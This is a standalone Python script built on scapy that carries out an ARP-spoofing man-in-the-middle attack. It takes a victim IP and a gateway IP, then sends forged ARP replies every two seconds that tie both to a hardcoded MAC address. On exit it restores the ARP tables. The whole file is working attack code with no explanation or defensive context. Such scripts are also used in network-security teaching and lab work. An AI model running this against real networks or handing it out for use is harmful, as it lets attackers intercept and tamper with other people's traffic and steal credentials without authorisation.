
from scapy.all import *
import time
from scapy.all import ARP
import argparse

def get_mac(ip):
    ans, _ = arping(ip)

    for snt, recv in ans:
        mac = recv[Ether].src
        return mac

def arp_spoof(ip_to_spoof, pretend_ip):
    arp_response = ARP()


    arp_response.op = 2 # now it is a response
    arp_response.pdst = ip_to_spoof
    arp_response.hwdst = get_mac(ip_to_spoof)
    arp_response.hwsrc = "00:0c:29:9d:e8:09"

    arp_response.psrc = pretend_ip  # 192.168.0.36
    send(arp_response, verbose=False)

def restore_arp_table(dst, src):
    arp_response = ARP()
    arp_response.op = 2 # now it is a response
    arp_response.pdst = dst
    arp_response.hwdst = get_mac(dst)
    arp_response.hwsrc = get_mac(src)

    arp_response.psrc = src  # 192.168.0.36
    send(arp_response, count=10, verbose=False)


def parse_user_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", help="Provide the target/victim IP", required=True)
    parser.add_argument("-g", "--gateway", help="Provide the gateway IP", required=True)

    args = vars(parser.parse_args())
    return args

if __name__ == "__main__":

    args = parse_user_arguments()

    victim_ip = args['target']
    gateway_ip = args['gateway']
    try: 
        while True:
            arp_spoof(victim_ip, gateway_ip)
            arp_spoof(gateway_ip, victim_ip)
            time.sleep(2)
    except  KeyboardInterrupt:
        print("[+] Exiting and restoring ARP tables")
        restore_arp_table(victim_ip, gateway_ip)
        restore_arp_table(gateway_ip, victim_ip)

